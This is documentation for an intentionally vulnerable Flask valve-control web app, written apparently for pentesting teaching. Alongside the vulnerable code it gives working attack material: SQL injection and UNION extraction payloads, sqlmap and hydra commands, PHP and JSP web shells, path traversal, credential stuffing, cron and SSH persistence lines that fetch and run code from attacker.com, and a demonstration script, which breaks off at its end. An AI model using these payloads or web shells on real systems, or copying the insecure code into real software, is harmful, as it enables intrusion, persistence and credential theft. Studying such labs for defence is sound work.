# Industrial Valve Control System - Vulnerable Version Documentation

## Overview

This document describes the **VULNERABLE** version of the Industrial Valve Control System, highlighting the security weaknesses that make it exploitable. This version is intentionally insecure for educational and penetration testing purposes.

---

## Key Differences from Patched Version

### 1. Missing Security Infrastructure

#### No Security Middleware
**Missing File**: `app/utils/security_middleware.py`

**Impact**:
- No IP blocking enforcement
- No user lock checking
- No session hijacking detection
- No suspicious user agent detection
- No cookie manipulation detection
- No 404 logging for brute force detection

**Consequence**: Attackers can operate without any global security checks.

#### No Automated Response System
**Missing File**: `app/utils/auto_response.py`

**Impact**:
- No automatic IP blocking
- No automatic account locking
- No automatic rate limiting
- No threshold-based responses

**Consequence**: System cannot respond to attacks automatically.

#### No Security Actions Management
**Missing File**: `app/routes/security_actions.py`

**Impact**:
- No manual IP blocking/unblocking
- No account locking/unlocking
- No security action reversal
- No auto-response rule configuration

**Consequence**: Admins cannot take security actions through the interface.

#### No Monitoring Dashboard
**Limited File**: `app/routes/monitoring.py` (basic version only)

**Impact**:
- Cannot view attack details
- Cannot see high-risk attacks
- Cannot view actionable attacks
- Cannot access blocked IPs or locked accounts

**Consequence**: No visibility into security incidents.

### 2. Simplified Database Schema

#### Reduced attack_logs Table
**Missing Columns**:
- `blocked` - Whether attack was blocked
- `classification` - Attack category
- `recommended_action` - Suggested response
- `action_taken` - What was done
- `action_reversible` - Can be undone
- `reverse_action_steps` - How to reverse
- `risk_score` - Risk level (0-100)
- `related_attack_id` - Attack chain tracking
- `raw_request_data` - Full request details
- `response_status` - HTTP response code
- `geolocation` - Geographic location

**Impact**: Limited attack analysis capability, no incident response support.

#### Missing Security Tables
The following tables **do not exist** in vulnerable version:
- `blocked_ips` - Cannot block IP addresses
- `failed_login_attempts` - Cannot track brute force
- `security_actions` - Cannot log responses
- `auto_response_rules` - No automated response
- `users_locked` - Cannot lock accounts

**Consequence**: No security management infrastructure.

### 3. Reduced Monitoring Capabilities

#### Simplified monitoring.py
**Missing Functions**:
- Pattern detection (SQL injection, XSS, path traversal, etc.)
- Risk score calculation
- Attack classification
- Action recommendation
- Session anomaly detection
- Cookie manipulation detection
- Directory brute force detection
- Rate limit violation detection
- Privilege escalation detection

**Available Functions** (basic only):
- `detect_sql_injection()` - Pattern matching only
- `detect_file_upload_abuse()` - Basic checks only
- `log_attack()` - Minimal logging (no risk score, no action)
- `check_and_log_sql_injection()` - Detection but no blocking
- `check_and_log_file_upload()` - Detection but no blocking

**Impact**: Can detect some attacks but cannot respond or calculate risk.

---

## Critical Vulnerabilities

### VULNERABILITY 1: SQL Injection

**Location**: `app/routes/valves.py:44`

**Vulnerable Code**:
```python
@valves_bp.route('/valves/search', methods=['GET', 'POST'])
@login_required
def search_valves():
    if request.method == 'POST':
        search_term = request.form.get('search', '').strip()
        
        from flask import session
        from app.models import get_db_connection, User
        
        user = User.get_by_id(session.get('user_id'))
        
        if user and user['role'] == 'admin':
            check_and_log_sql_injection(search_term, '/valves/search')
            
            try:
                conn = get_db_connection()
                # VULNERABLE: String concatenation in SQL
                query = f"SELECT * FROM valves WHERE valve_name LIKE '%{search_term}%' OR location LIKE '%{search_term}%' ORDER BY valve_name"
                valves_raw = conn.execute(query).fetchall()
                conn.close()
                valves = [dict(v) for v in valves_raw]
            except Exception as e:
                flash(f'Search error: {str(e)}', 'danger')
                return redirect(url_for('valves.list_valves'))
```

**Why It's Vulnerable**:
1. Uses f-string to build SQL query (line 44)
2. User input directly embedded in query
3. No parameterized queries
4. Only admins can exploit (role check on line 39)
5. Detection exists but doesn't block the request

**Exploitation**:
```
Search Term: ' OR 1=1--
Query Becomes: SELECT * FROM valves WHERE valve_name LIKE '%' OR 1=1--%' OR location LIKE '%' OR 1=1--%'
Result: Returns all valves
```

**Advanced Exploitation**:
```
# Extract database schema
' UNION SELECT sql, name, type, '', '', '', '', '', '', '', '', '', '' FROM sqlite_master--

# Extract user table
' UNION SELECT id, username, password_hash, role, email, '', '', '', '', '', '', '', '' FROM users--

# Extract specific data
' UNION SELECT valve_name, location, open_percentage, '', '', '', '', '', '', '', '', '', '' FROM valves--
```

**Tools**: SQLMap can fully exploit this
```bash
sqlmap -u "http://target/valves/search" --data "search=test" \
       --cookie="session=admin_session_cookie" \
       --level=5 --risk=3 --dump
```

**Impact**: 
- **Confidentiality**: Full database access (users, passwords, valves, logs)
- **Integrity**: Can modify data with UPDATE, DELETE
- **Availability**: Can drop tables, crash system
- **Privilege Escalation**: Can read admin passwords

### VULNERABILITY 2: File Upload - No Validation (Scenario 1)

**Location**: `app/routes/upload.py:56-98`

**Vulnerable Code**:
```python
@upload_bp.route('/upload/scenario1', methods=['GET', 'POST'])
@admin_required
def upload_scenario1():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file provided', 'danger')
            return redirect(request.url)
        
        file = request.files['file']
        if file.filename == '':
            flash('No file selected', 'danger')
            return redirect(request.url)
        
        original_filename = file.filename  # NO SANITIZATION
        
        check_and_log_file_upload(...)  # Detection only, doesn't block
        
        # VULNERABLE: Original filename used, no validation
        upload_path = os.path.join(UPLOAD_FOLDER, 'firmware', original_filename)
        file.save(upload_path)  # Saves directly with original name
```

**Why It's Vulnerable**:
1. **No filename sanitization**: `secure_filename()` not used
2. **No extension checking**: Any file type accepted
3. **No content validation**: Doesn't check magic bytes
4. **No size limit**: Accepts unlimited file sizes
5. **Original filename preserved**: Predictable file paths
6. **Saves in firmware directory**: May be in webroot

**Exploitation - Web Shell Upload**:
```bash
# Create malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload
curl -F "file=@shell.php" -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario1

# Access web shell
curl http://target/uploads/firmware/shell.php?cmd=whoami
```

**Exploitation - Path Traversal**:
```bash
# Create file with traversal path
echo 'malicious' > '../../../etc/cron.d/backdoor'

# Upload (filename preserved as-is)
curl -F "file=@../../../etc/cron.d/backdoor" \
     http://target/upload/scenario1

# Result: File written outside upload directory
```

**Impact**:
- **Remote Code Execution**: Upload and execute web shell
- **System Compromise**: Write to system directories
- **Data Exfiltration**: Execute commands to steal data
- **Persistence**: Install backdoors

### VULNERABILITY 3: File Upload - Bypassable Validation (Scenario 2)

**Location**: `app/routes/upload.py:100-157`

**Vulnerable Code**:
```python
@upload_bp.route('/upload/scenario2', methods=['GET', 'POST'])
@admin_required
def upload_scenario2():
    if request.method == 'POST':
        # ...
        original_filename = file.filename
        file_ext = get_file_extension(original_filename)
        
        # VULNERABLE 1: Uses header for size check
        claimed_file_size = request.headers.get('X-File-Size', type=int)
        if not claimed_file_size:
            claimed_file_size = request.content_length or 0
        
        check_and_log_file_upload(
            filename=original_filename,
            content_type=file.content_type or 'unknown',
            file_size=claimed_file_size,  # Uses claimed size, not actual
            endpoint='/upload/scenario2'
        )
        
        # VULNERABLE 2: Checks claimed size, not actual size
        if claimed_file_size > MAX_FILE_SIZE:
            flash(f'File too large. Maximum size: {MAX_FILE_SIZE / 1024 / 1024}MB', 'danger')
            return redirect(request.url)
        
        # VULNERABLE 3: Blacklist approach (incomplete)
        blacklisted_extensions = ['.exe', '.sh', '.bat', '.php']
        if file_ext in blacklisted_extensions:
            flash(f'File type not allowed: {file_ext}', 'danger')
            return redirect(request.url)
        
        # Saves file without further validation
        stored_filename = f"{secrets.token_hex(16)}_{original_filename}"
        upload_path = os.path.join(UPLOAD_FOLDER, 'firmware', stored_filename)
        file.save(upload_path)
```

**Why It's Vulnerable**:

**Vulnerability 3A: Size Bypass**
1. Uses `X-File-Size` header or `Content-Length`
2. Attacker controls headers
3. Doesn't check actual file size after upload
4. Can upload files larger than limit

**Vulnerability 3B: Extension Blacklist**
1. Only blocks: .exe, .sh, .bat, .php
2. Doesn't block: .jsp, .asp, .aspx, .py, .rb, .pl, .cgi
3. Blacklist approach - easy to bypass
4. No content-type validation

**Vulnerability 3C: Double Extension**
1. Only checks final extension
2. `malicious.php.bin` → extracts `.bin`
3. Passes blacklist check
4. Server may still execute as PHP

**Exploitation - Size Bypass**:
```bash
# Create 10MB file (exceeds 5MB limit)
dd if=/dev/urandom of=large.bin bs=1M count=10

# Bypass size check with fake header
curl -F "file=@large.bin" \
     -H "X-File-Size: 1000" \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario2

# Result: 10MB file uploaded despite 5MB limit
```

**Exploitation - Extension Bypass (Non-Blacklisted)**:
```bash
# JSP web shell (not in blacklist)
echo '<%@ page import="java.io.*" %><% out.println(new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream())).readLine()); %>' > shell.jsp

# Upload
curl -F "file=@shell.jsp" \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario2

# Access if server processes JSP
curl http://target/uploads/firmware/*_shell.jsp?cmd=whoami
```

**Exploitation - Double Extension**:
```bash
# Create malicious PHP with .bin extension
echo '<?php system($_GET["cmd"]); ?>' > backdoor.php.bin

# Upload (passes .bin extension check)
curl -F "file=@backdoor.php.bin" \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario2

# If server misconfigured, may execute as PHP
curl http://target/uploads/firmware/*_backdoor.php.bin?cmd=id
```

**Impact**:
- **Size Limit Bypass**: Upload arbitrarily large files (DoS)
- **Malicious File Upload**: Execute code via non-blacklisted extensions
- **Content-Type Spoofing**: No validation of actual file type

### VULNERABILITY 4: File Upload - Scan-Then-Encrypt (Scenario 3)

**Location**: `app/routes/upload.py:159-216`

**Vulnerable Code**:
```python
@upload_bp.route('/upload/scenario3', methods=['GET', 'POST'])
@admin_required
def upload_scenario3():
    if request.method == 'POST':
        # ...
        original_filename = secure_filename(file.filename)
        file_content = file.read()
        
        check_and_log_file_upload(...)  # Logs but doesn't block
        
        # Encrypt the file
        cipher = AES.new(AES_KEY, AES.MODE_CBC)
        encrypted_content = cipher.encrypt(pad(file_content, AES.block_size))
        
        stored_filename = f"{secrets.token_hex(16)}.enc"
        upload_path = os.path.join(UPLOAD_FOLDER, 'encrypted', stored_filename)
        
        # Write encrypted content
        with open(upload_path, 'wb') as f:
            f.write(cipher.iv + encrypted_content)
        
        # VULNERABLE: Scan runs on ENCRYPTED content
        if MAGIC_AVAILABLE:
            with open(upload_path, 'rb') as f:
                temp_content = f.read(100)
                mime = magic.Magic(mime=True)
                detected_type = mime.from_buffer(temp_content)
            # Reject if not allowed
            if not validate_file_content(upload_path):
                os.remove(upload_path)
                flash(f'File content validation failed: {detected_type}', 'danger')
                return redirect(request.url)
```

**Decryption Endpoint** (Even More Vulnerable):
```python
@upload_bp.route('/upload/scenario3/decrypt/<int:file_id>', methods=['POST'])
@admin_required
def decrypt_file(file_id):
    # ...
    with open(encrypted_path, 'rb') as f:
        iv = f.read(16)
        encrypted_content = f.read()
    
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    decrypted_content = unpad(cipher.decrypt(encrypted_content), AES.block_size)
    
    decrypted_filename = f"decrypted_{upload['original_filename']}"
    decrypted_path = os.path.join(UPLOAD_FOLDER, 'firmware', decrypted_filename)
    
    # VULNERABLE: Saves decrypted file WITHOUT any validation
    with open(decrypted_path, 'wb') as f:
        f.write(decrypted_content)
    
    flash(f'File decrypted successfully: {decrypted_filename}', 'success')
    return redirect(url_for('upload.upload_index'))
```

**Why It's Vulnerable**:

**Scan-Then-Encrypt Problem**:
1. File content is encrypted BEFORE scanning
2. Magic bytes scan runs on encrypted content (binary gibberish)
3. Encrypted content always appears as "data" or "application/octet-stream"
4. Malicious patterns hidden by encryption
5. Validation always passes for encrypted files

**Decrypt-Then-Save Problem**:
1. Decryption endpoint has NO validation
2. Malicious content revealed after decryption
3. Immediately saved to uploads/firmware/
4. No checks for PHP code, JavaScript, etc.
5. No content-type validation on decrypted data

**Exploitation - Iterative Attack**:
```bash
# Step 1: Create malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Upload via scenario3 (encrypts before scan)
curl -F "file=@shell.php" \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario3
# Result: Passes validation (scanning encrypted gibberish)

# Step 3: Get file_id from response or database
FILE_ID=1

# Step 4: Decrypt the file
curl -X POST \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario3/decrypt/$FILE_ID
# Result: decrypted_shell.php saved in uploads/firmware/

# Step 5: Execute web shell
curl http://target/uploads/firmware/decrypted_shell.php?cmd=whoami
```

**Exploitation - Iterative Refinement**:
```python
# Attacker script to bypass validation iteratively
import requests

malicious_payloads = [
    b'<?php system($_GET["cmd"]); ?>',
    b'<script>alert(1)</script>',
    b'<?php eval($_POST["x"]); ?>',
]

for payload in malicious_payloads:
    # Upload encrypted
    r = requests.post(
        'http://target/upload/scenario3',
        files={'file': ('test.bin', payload)},
        cookies={'session': admin_cookie}
    )
    
    if 'uploaded successfully' in r.text:
        print(f"[+] Payload accepted: {payload[:20]}")
        # Extract file_id and decrypt
        # Validation happens too late
```

**Impact**:
- **Validation Bypass**: Malicious content hidden in encryption
- **Delayed Detection**: Threats revealed only after decryption
- **Guaranteed Upload**: Encrypted files always pass scan
- **No Defense at Decryption**: Files saved without checks
- **Remote Code Execution**: Upload and decrypt web shells

**Timeline of Attack**:
1. **Upload**: Malicious PHP encrypted → Scan sees binary (passes)
2. **Storage**: Encrypted file stored in uploads/encrypted/
3. **Decryption**: Admin decrypts file → PHP code revealed
4. **Storage**: Saved as decrypted_*.php in uploads/firmware/ (no scan)
5. **Execution**: Attacker accesses decrypted web shell

### VULNERABILITY 5: No Brute Force Protection

**Location**: `app/routes/auth.py:13-43`

**Vulnerable Code**:
```python
@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip_address = request.remote_addr
        
        # NO RATE LIMITING HERE
        
        user = User.authenticate(username, password)
        
        if user:
            # Success - create session
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['role'] = user['role']
            session['ip_address'] = ip_address
            
            User.update_last_login(user['id'])
            flash(f'Welcome back, {user["username"]}!', 'success')
            
            return redirect(url_for('dashboard.index'))
        else:
            # Failure - only logs, no blocking
            log_attack(
                attack_type='login_brute_force',
                endpoint='/login',
                payload=f'username: {username}',
                severity='medium',
                details=f'Failed login attempt for user: {username}'
            )
            
            flash('Invalid username or password', 'danger')
    
    return render_template('login.html')
```

**Why It's Vulnerable**:
1. **No rate limiting**: Unlimited login attempts
2. **No IP blocking**: Same IP can try forever
3. **No account lockout**: Unlimited attempts per username
4. **No CAPTCHA**: No human verification
5. **No delay**: Instant response for each attempt
6. **No progressive delay**: No increasing timeout
7. **Failed attempts tracked but not enforced**

**Exploitation - Brute Force Attack**:
```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      target http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"

# Using Burp Suite Intruder
# 1. Capture login POST request
# 2. Send to Intruder
# 3. Set password as payload position
# 4. Load wordlist
# 5. Start attack
# 6. No rate limiting = fast enumeration

# Custom Python script
import requests

wordlist = open('passwords.txt', 'r').readlines()
url = 'http://target/login'

for password in wordlist:
    password = password.strip()
    r = requests.post(url, data={
        'username': 'admin',
        'password': password
    })
    
    if 'Invalid username' not in r.text:
        print(f"[+] Found password: {password}")
        break
    
    # No delay needed, no rate limiting
```

**Exploitation - Credential Stuffing**:
```bash
# Using leaked credentials from data breaches
for line in $(cat leaked_credentials.txt); do
    username=$(echo $line | cut -d: -f1)
    password=$(echo $line | cut -d: -f2)
    
    curl -X POST http://target/login \
         -d "username=$username&password=$password" \
         -c cookies.txt
    
    if grep -q "Welcome back" cookies.txt; then
        echo "[+] Valid: $username:$password"
    fi
done
```

**Impact**:
- **Account Compromise**: Unlimited password guessing
- **Credential Stuffing**: Test leaked credentials
- **Username Enumeration**: Different responses for valid/invalid users
- **No Detection**: Attacks logged but not blocked
- **Fast Attacks**: No rate limiting or delays

### VULNERABILITY 6: Missing Security Checks

**Location**: `app/app.py` (entire file)

**Vulnerable Code**:
```python
from flask import Flask
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SESSION_TYPE'] = 'filesystem'

# Register blueprints
from app.routes.auth import auth_bp
from app.routes.dashboard import dashboard_bp
from app.routes.valves import valves_bp
from app.routes.upload import upload_bp
from app.routes.monitoring import monitoring_bp
from app.routes.logs import logs_bp

app.register_blueprint(auth_bp)
app.register_blueprint(dashboard_bp)
app.register_blueprint(valves_bp)
app.register_blueprint(upload_bp)
app.register_blueprint(monitoring_bp)
app.register_blueprint(logs_bp)

# NO @app.before_request SECURITY MIDDLEWARE
# NO @app.errorhandler(404) LOGGING
```

**What's Missing**:

**1. No before_request Hook**
```python
# This doesn't exist in vulnerable version:
@app.before_request
def before_request_security():
    return security_checks()
```

**Missing Checks**:
- IP blocklist enforcement
- User account lock enforcement
- Session hijacking detection
- Suspicious user agent detection
- Cookie manipulation detection
- Session IP tracking

**2. No 404 Handler**
```python
# This doesn't exist in vulnerable version:
@app.errorhandler(404)
def handle_404(error):
    return log_404_handler(error)
```

**Missing Detection**:
- Directory brute force detection
- Path enumeration tracking
- Automated scanning detection

**3. No File Upload Size Limit**
```python
# This doesn't exist in vulnerable version:
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB
```

**Impact**: No global file size limit enforcement

**Exploitation**:

**Session Hijacking** (No Detection):
```bash
# Steal session cookie
SESSION_COOKIE="stolen_session_cookie"

# Use from different IP (no detection)
curl -H "Cookie: session=$SESSION_COOKIE" \
     -H "User-Agent: Different Browser" \
     -H "X-Forwarded-For: 1.2.3.4" \
     http://target/dashboard

# Result: Works without any alerts
```

**Directory Brute Force** (No Detection):
```bash
# Use dirbuster/gobuster
gobuster dir -u http://target \
             -w /usr/share/wordlists/dirb/common.txt \
             -t 50

# Result: Thousands of 404s, no blocking or alerts
```

**Scanning Tools** (No Detection):
```bash
# Use automated scanners
nikto -h http://target
sqlmap -u http://target/valves/search --data="search=test"
burpsuite (active scan)

# Result: Tool user agents not detected, no blocking
```

**Impact**:
- **No Global Defense**: Each route must implement own security
- **Inconsistent Protection**: Some routes protected, some not
- **Easy Reconnaissance**: Can enumerate paths without detection
- **Session Hijacking**: No IP change detection
- **Tool Usage**: Automated scanners undetected

---

## Additional Weaknesses

### 1. Limited Attack Logging

**Simplified Log Structure**:
```python
AttackLog.create(
    attack_type=attack_type,
    endpoint=endpoint,
    user_id=user_id,
    ip_address=ip_address,
    user_agent=user_agent,
    request_method=request_method,
    payload=payload,
    severity=severity,
    details=details  # Only basic info
)
```

**Missing**:
- Risk score calculation
- Attack classification
- Recommended actions
- Action tracking
- Attack chain analysis
- Full request details
- Response codes
- Geolocation

**Impact**: Limited incident response capability

### 2. No Security Management

**Missing Capabilities**:
- Cannot block IPs manually
- Cannot lock accounts manually
- Cannot configure auto-response
- Cannot view security actions history
- Cannot reverse security actions
- No centralized security dashboard

**Impact**: Admins cannot respond to attacks through UI

### 3. No Security Models in Database

**Missing Tables**:
- `blocked_ips` → Cannot block attackers
- `failed_login_attempts` → Cannot track brute force
- `security_actions` → Cannot log responses
- `auto_response_rules` → Cannot configure automation
- `users_locked` → Cannot lock compromised accounts

**Impact**: No infrastructure for security management

### 4. Simplified Monitoring

**Limited Detection**:
- Basic SQL injection pattern matching
- Basic file upload checks
- No XSS detection
- No path traversal detection
- No rate limiting
- No session anomaly detection
- No cookie manipulation detection
- No privilege escalation detection
- No directory brute force detection

**Impact**: Many attack types undetected

---

## Attack Scenarios

### Scenario 1: Full Database Extraction via SQL Injection

**Target**: Admin user with SQL injection access

**Steps**:
1. **Authenticate as admin**: 
   - Brute force or phish credentials (no rate limiting)
   
2. **Enumerate database**:
   ```
   Search: ' UNION SELECT sql, '', '', '', '', '', '', '', '', '', '', '', '' FROM sqlite_master--
   Result: Get all table schemas
   ```

3. **Extract users**:
   ```
   Search: ' UNION SELECT id, username, password_hash, role, email, '', '', '', '', '', '', '', '' FROM users--
   Result: All user records with password hashes
   ```

4. **Extract valves**:
   ```
   Search: ' UNION SELECT id, valve_name, location, open_percentage, status, '', '', '', '', '', '', '' FROM valves--
   Result: All valve data
   ```

5. **Extract command logs**:
   ```
   Search: ' UNION SELECT id, valve_id, command, user_id, timestamp, '', '', '', '', '', '', '', '' FROM command_logs--
   Result: Full operational history
   ```

6. **Offline password cracking**:
   ```bash
   john --wordlist=rockyou.txt --format=bcrypt hashes.txt
   hashcat -m 3200 hashes.txt rockyou.txt
   ```

**Impact**: Complete database compromise, credential theft, operational intelligence

### Scenario 2: Remote Code Execution via File Upload

**Target**: Admin user with upload access

**Attack Path 1: Scenario 1 (No Validation)**:
```bash
# 1. Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload
curl -F "file=@shell.php" \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario1

# 3. Execute commands
curl http://target/uploads/firmware/shell.php?cmd=cat%20/etc/passwd
curl http://target/uploads/firmware/shell.php?cmd=whoami
curl http://target/uploads/firmware/shell.php?cmd=wget%20http://attacker.com/backdoor.sh
curl http://target/uploads/firmware/shell.php?cmd=bash%20backdoor.sh
```

**Attack Path 2: Scenario 2 (Extension Bypass)**:
```bash
# 1. Create JSP web shell (not in blacklist)
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<% 
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line);
}
%>
EOF

# 2. Upload
curl -F "file=@shell.jsp" \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario2

# 3. Execute (if JSP processed)
curl http://target/uploads/firmware/*_shell.jsp?cmd=id
```

**Attack Path 3: Scenario 3 (Encrypt-Then-Decrypt)**:
```bash
# 1. Create web shell
echo '<?php eval($_POST["x"]); ?>' > backdoor.php

# 2. Upload via scenario3 (bypasses scan through encryption)
FILE_ID=$(curl -F "file=@backdoor.php" \
               -H "Cookie: session=admin_cookie" \
               http://target/upload/scenario3 | grep -oP 'file_id=\K\d+')

# 3. Decrypt (saves without validation)
curl -X POST \
     -H "Cookie: session=admin_cookie" \
     http://target/upload/scenario3/decrypt/$FILE_ID

# 4. Execute
curl -X POST \
     -d 'x=system("whoami");' \
     http://target/uploads/firmware/decrypted_backdoor.php
```

**Impact**: Full server compromise, data exfiltration, persistence

### Scenario 3: Persistent Access via Multiple Vectors

**Goal**: Maintain access even if one method discovered

**Step 1: Initial Access (Brute Force)**:
```bash
# No rate limiting, try common passwords
hydra -l admin -P passwords.txt target http-post-form "/login:..."
```

**Step 2: Privilege Mapping (SQL Injection)**:
```
# Extract all users and roles
Search: ' UNION SELECT username, role, email, '', '', '', '', '', '', '', '', '', '' FROM users--
```

**Step 3: Backdoor Installation (File Upload)**:
```bash
# Upload multiple web shells with different techniques
# Scenario 1: shell1.php
# Scenario 2: shell2.jsp
# Scenario 3: encrypted shell3.php
```

**Step 4: Credential Theft (SQL Injection)**:
```
# Extract password hashes
Search: ' UNION SELECT username, password_hash, '', '', '', '', '', '', '', '', '', '', '' FROM users--
# Crack offline
```

**Step 5: Create Backup Account (SQL Injection)**:
```
# Insert new admin user (if permissions allow)
Search: '; INSERT INTO users (username, password_hash, role) VALUES ('backup', '$2b$12$...', 'admin')--
```

**Step 6: Establish Persistence**:
```bash
# Via web shell, create cron job
echo "* * * * * wget http://attacker.com/beacon.php -O /tmp/b && bash /tmp/b" | crontab -

# Or install SSH backdoor
mkdir ~/.ssh
echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys
```

**Impact**: Multiple entry points, difficult to fully remediate

---

## How to Exploit (Penetration Testing Guide)

### Setup
```bash
# Install tools
sudo apt install sqlmap hydra nikto burpsuite gobuster

# Target information
TARGET="http://vulnerable-valves.local:5000"
```

### Test 1: SQL Injection
```bash
# Get admin cookie first (brute force or phish)
ADMIN_COOKIE="..."

# Test with SQLMap
sqlmap -u "$TARGET/valves/search" \
       --data "search=test" \
       --cookie "session=$ADMIN_COOKIE" \
       --level=5 --risk=3 \
       --dump

# Manual test
curl -X POST "$TARGET/valves/search" \
     -d "search=' OR 1=1--" \
     -H "Cookie: session=$ADMIN_COOKIE"
```

### Test 2: Brute Force
```bash
# Test rate limiting (should succeed)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      ${TARGET#http://} http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid username"
```

### Test 3: File Upload (Scenario 1)
```bash
# Create test file
echo '<?php phpinfo(); ?>' > test.php

# Upload
curl -F "file=@test.php" \
     -H "Cookie: session=$ADMIN_COOKIE" \
     "$TARGET/upload/scenario1"

# Verify
curl "$TARGET/uploads/firmware/test.php"
```

### Test 4: File Upload (Scenario 2 - Size Bypass)
```bash
# Create large file
dd if=/dev/urandom of=large.bin bs=1M count=10

# Bypass with fake header
curl -F "file=@large.bin" \
     -H "X-File-Size: 1000" \
     -H "Cookie: session=$ADMIN_COOKIE" \
     "$TARGET/upload/scenario2"
```

### Test 5: File Upload (Scenario 3 - Encrypt Bypass)
```bash
# Create malicious file
echo '<?php system($_GET["c"]); ?>' > backdoor.php

# Upload (encrypts, passes scan)
curl -F "file=@backdoor.php" \
     -H "Cookie: session=$ADMIN_COOKIE" \
     "$TARGET/upload/scenario3" \
     --verbose | tee response.txt

# Extract file_id from response
FILE_ID=$(grep -oP 'file_id=\K\d+' response.txt)

# Decrypt
curl -X POST \
     -H "Cookie: session=$ADMIN_COOKIE" \
     "$TARGET/upload/scenario3/decrypt/$FILE_ID"

# Execute
curl "$TARGET/uploads/firmware/decrypted_backdoor.php?c=whoami"
```

---

## Comparison Summary

| Feature | Vulnerable | Patched |
|---------|-----------|---------|
| SQL Injection Protection | ❌ Admin bypass | ✅ All users protected |
| File Upload Validation | ❌ Multiple bypasses | ✅ Multi-layer defense |
| Brute Force Protection | ❌ None | ✅ Rate limiting + lockout |
| Security Middleware | ❌ Missing | ✅ Before every request |
| Attack Logging | ⚠️ Basic | ✅ Comprehensive |
| Risk Scoring | ❌ None | ✅ Dynamic calculation |
| Automated Response | ❌ None | ✅ Configurable rules |
| IP Blocking | ❌ No capability | ✅ Manual + automatic |
| Account Locking | ❌ No capability | ✅ Manual + automatic |
| Security Dashboard | ⚠️ Basic | ✅ Full featured |
| Attack Classification | ❌ None | ✅ Category + stage |
| Action Recommendations | ❌ None | ✅ AI-driven suggestions |
| Session Hijacking Detection | ❌ None | ✅ IP tracking |
| Cookie Manipulation Detection | ❌ None | ✅ Size + content checks |
| Directory Brute Force Detection | ❌ None | ✅ 404 tracking |
| Privilege Escalation Detection | ❌ None | ✅ Role + endpoint checks |
| Security Action Reversal | ❌ N/A | ✅ Supported |
| Attack Chain Tracking | ❌ None | ✅ Related attack IDs |

---

## Demonstration Script

For your presentation, you can use this script to demonstrate each vulnerability:

```bash
#!/bin/bash

TARGET="http://localhost:5001"  # Vulnerable version
ADMIN_USER="admin"
ADMIN_PASS="admin"  # Default password

echo "=== Vulnerability Demonstration Script ==="
echo ""

# Step 1: Login
echo "[*] Step 1: Logging in as admin..."
curl -X POST "$TARGET/login" \
     -d "username=$ADMIN_USER&password=$ADMIN_PASS" \
     -c cookies.txt -s > /dev/null
echo "✓ Logged in"

# Step 2: SQL Injection
echo ""
echo "[*] Step 2: Testing SQL Injection..."
echo "Payload: ' OR 1=1--"
curl -X POST "$TARGET/valves/search" \
     -b cookies.txt \
     -d "search=' OR 1=1--" \
     -s | grep -o "valve_name" | wc -l
echo "✓ Retrieved all valves (bypassed search filter)"

# Step 3: Extract Database
echo ""
echo "[*] Step 3: Extracting user table..."
curl -X POST "$TARGET/valves/search" \
     -b cookies.txt \
     -d "search=' UNION SELECT username, password_hash, role, '', '', '', '', '', '', '', '', '', '' FROM users--" \
     -s > users_dump.html
echo "✓ Saved to users_dump.html"

# Step 4: File Upload - No Validation
echo ""
echo "[*] Step 4: Testing file upload (Scenario 1 - No validation)..."
echo '<?php echo "RCE Success"; ?>' > /tmp/test.php
curl -X POST "$TARGET/upload/scenario1" \
     -b cookies.txt \
     -F "file=@/tmp/test.php" \
     -s > /dev/null
echo "✓ Uploaded test.php without any validation"

# Step 5: File Upload - Size Bypass
echo ""
echo "[*] Step 5: Testing file upload (Scenario 2 - Size bypass)..."
dd if=/dev/urandom of=/tmp/large.bin bs=1M count=10 2>/dev/null
curl -X POST "$TARGET/upload/scenario2" \
     -b cookies.txt \
     -H "X-File-Size: 1000" \
     -F "file=@/tmp/large.bin" \
     -s > /dev/null
echo "✓ Uploaded 10MB file with fake 1KB header"

# Step 6: File Upload - Encrypt Bypass
echo ""
echo "[*] Step 6: Testing file upload (Scenario 3 - Encrypt bypass)..."
echo '<?php system("whoami"); ?>' > /tmp/backdoor.php
RESPONSE=$(curl -X POST "$TARGET/upload/scenario3" \
     -b cookies.txt \
     -F "file=@/tmp/backdoor.php" \
     -s)
echo "✓ Uploaded encrypted malicious file (bypassed scan)"

echo ""
echo "[*] Step 7: Decrypting malicious file..."
# Extract file ID and decrypt
FILE_ID=$(echo "$RESPONSE" | grep -oP 'file_id=\K\d+' | head -1)
if [ ! -z "$FILE_ID" ]; then
    curl -X POST "$TARGET/upload/scenario3/decrypt/$FILE_ID" \
         -b cookies.txt \
         -s > /dev/null
    echo "✓ Decrypted without content validation"
fi

# Step 8: Brute Force Test
echo ""
echo "[*] Step 8: Testing brute force protection..."
for i in {1..20}; do
    curl -X POST "$TARGET/login" \
         -d "username=admin&password=wrong$i" \
         -s > /dev/null &
done
wait
echo "✓ Sent 20 failed login attempts (no rate limiting triggered)"

echo ""
echo "=== All vulnerabilities demonstrated ==="
echo ""
echo "Files created:"
